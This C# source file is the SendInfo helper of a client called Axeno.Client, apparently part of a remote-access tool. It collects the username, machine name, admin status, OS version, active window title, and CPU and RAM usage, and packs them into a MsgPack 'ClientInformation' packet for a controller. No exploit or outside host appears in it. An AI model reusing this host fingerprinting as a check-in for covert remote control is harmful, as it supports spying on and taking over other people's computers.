﻿using Axeno.Client.Properties;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Axeno.Client.MessagePack;
using Axeno.Client.Networking.Functions;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace Axeno.Client.Helper
{
    internal class SendInfo
    {
        public static string UID = "N/A";
        public static PerformanceCounter totalMemoryCounter = new PerformanceCounter("Memory", "Available MBytes");
        public static PerformanceCounter usedMemoryCounter = new PerformanceCounter("Memory", "% Committed Bytes In Use");
        public static PerformanceCounter cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");

        public static byte[] GetAndSendInformation()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInformation";
            msgpack.ForcePathObject("Group").AsString = "Default";
            msgpack.ForcePathObject("Username").AsString = Environment.UserName.ToString() + "/" + Environment.MachineName;
            msgpack.ForcePathObject("Applevel").AsString = IsAdministrator();
            msgpack.ForcePathObject("Instdate").AsString = InstallDate();
            msgpack.ForcePathObject("Operatingsystem").AsString = OperatingSystemInfo();
            msgpack.ForcePathObject("Version").AsString = Settings.Version;
            msgpack.ForcePathObject("UID").AsString = UID;
            msgpack.ForcePathObject("ActiveWin").AsString = ClientControl.GetActiveWindowTitle();
            msgpack.ForcePathObject("CPU%").AsString = CPU();
            msgpack.ForcePathObject("RAM%").AsString = RAM();

            return msgpack.Encode2Bytes();
        }
        public static string InstallDate()
        {
            RegistryKey keyopen = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AxenoSettings");
            if (keyopen != null )
            {
                string instdate = keyopen.GetValue("Install_Date").ToString();
                keyopen.Close();
                return instdate;
            }else
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\AxenoSettings");
                key.SetValue("Install_Date", DateTime.Today.ToString("dd-MM-yy"));
                key.Close();
                return DateTime.Today.ToString("dd-MM-yy");
            }


        }
        public static string OperatingSystemInfo()
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
            string pathName = (string)registryKey.GetValue("productName");
            registryKey.Close();
            return pathName;
        }

        public static string IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                return "Administrator";
            }else
            {
                return "Usermode";
            }

        }
        public static string CPU()
        {
            int cpuPercentage = GetCpuUsagePercentage(cpuCounter);
            return cpuPercentage.ToString() + "%";
        }
        static int GetCpuUsagePercentage(PerformanceCounter cpuCounter)
        {
            // The first call to NextValue() returns 0, so call it twice with a delay
            cpuCounter.NextValue();
            Thread.Sleep(100);
            return (int)Math.Round(cpuCounter.NextValue());
        }
        public static string RAM()
        {

            float ramPercentage = GetRamUsagePercentage(totalMemoryCounter, usedMemoryCounter);
            return ramPercentage.ToString() + "%";

        }
        static int GetRamUsagePercentage(PerformanceCounter totalMemoryCounter, PerformanceCounter usedMemoryCounter)
        {
            float usedMemoryPercentage = usedMemoryCounter.NextValue();

            return (int)Math.Round(usedMemoryPercentage);
        }

    }
}
